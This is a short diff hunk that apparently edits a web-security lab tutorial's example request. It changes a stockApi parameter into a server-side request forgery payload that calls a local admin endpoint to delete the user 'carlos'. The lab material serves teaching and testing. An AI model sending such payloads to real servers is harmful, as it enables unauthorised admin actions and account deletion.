@@ -15,7 +15,7 @@ POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
 
-stockApi=<b>http://localhost/admin</b>
+stockApi=<b>http://localhost/admin/delete?username=carlos</b>
 </pre>
 
 
